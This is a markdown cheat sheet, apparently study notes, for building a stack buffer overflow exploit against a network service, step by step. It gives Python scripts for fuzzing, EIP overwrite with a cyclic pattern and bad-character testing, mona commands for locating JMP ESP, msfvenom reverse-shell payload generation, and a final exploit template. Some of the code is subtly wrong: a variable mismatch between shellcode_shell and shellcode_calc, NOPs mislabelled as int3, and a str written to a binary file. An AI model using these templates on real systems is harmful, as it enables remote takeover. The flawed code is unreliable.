# BufferOverflow Notes
Thanks to Legacy for for being a great teacher! Please check out his buffer overflow guide!  
[Legacyy](https://github.com/iilegacyyii)  
[Legacyy's cheat sheet](https://github.com/iilegacyyii/x32-BOF-Notes)  

### 1 - Creating a socket to test the program.

```python
import socket
import struct

HOST = "<IP>"
PORT = <PORT>

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
print(s.recv(1024))

buf = b""
buf += b"<FUNC> "
buf += b"A"*1000

s.send(buf)
print(s.recv(1024))
```

### 2 - Creating your cyclic pattern and overwriting your EIP

Creation of cyclic pattern
```
msf-pattern_create -l 1234
```

```python
import socket
import struct

HOST = "127.0.0.1"
PORT = 1234

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
print(s.recv(1024))

cyclic_pattern = b"AddCyclicPattern"

buf = b""
buf += b"<FUNC> "
buf += cyclic_pattern

s.send(buf)
print(s.recv(1024))
```

### 3 - Testing for bad characters



```python
import socket
import struct

HOST = "127.0.0.1"
PORT = 1234

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
print(s.recv(1024))

badchar_test = ""
badchars = [0x00]       # Definite bad chars

for i in range(0x00, 0xFF + 1): # range(0x00, 0xFF) only returns up to 0xFE
        if i not in badchars:
                badchar_test += chr(i)

with open("badchars.bin", "wb") as f:
    f.write(badchar_test)

buf = b""
buf += b"<FUNC> "
buf += b"BBBB"
buf += badchar_test

s.send(buf)
print(s.recv(1024))
```

### 4 - Finding your JMP ESP

```
!mona compare -a esp -f "c:\path\to\badchars.bin"
```

```
!mona jmp -r esp -cpb "\x00\x0A"
```

### 5 - Testing command execution

```python
import socket
import struct

HOST = "<IP>"
PORT = <PORT>

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
print(s.recv(1024))

#bad characters <AddBadCharactersHere> 
offset = <OFFSET>
jmp_esp = struct.pack("<I", 0xJMPADDRESS)

buf = b""
buf += b"<FUNC> "
buf += b"A" * offset
buf += jmp_esp
buf += b"\xCC\xCC\xCC"

s.send(buf)
print(s.recv(1024))
```

```
msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
```

```
msfvenom -p windows/shell_reverse_tcp -b '\x00\x0A' -f python --var-name shellcode_shell LHOST="<IP>" LPORT=<PORT> EXITFUNC=thread
```

```python
import socket
import struct

HOST = "<Remote IP>"
PORT = <PORT>

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
print(s.recv(1024))

shellcode_shell =  b""
shellcode_shell += b"<ShellcodePayload"

#bad characters <AddBadCharactersHere> 
offset = 634
jmp_esp = struct.pack("<I", 0x625011AF)

buf = b""
buf += b"<FUNC> "
buf += b"A" * offset 
buf += jmp_esp
buf += b"\x90" * 100 #int3 instruction (breakpoint)
buf += shellcode_calc
s.send(buf)
print(s.recv(1024))
```
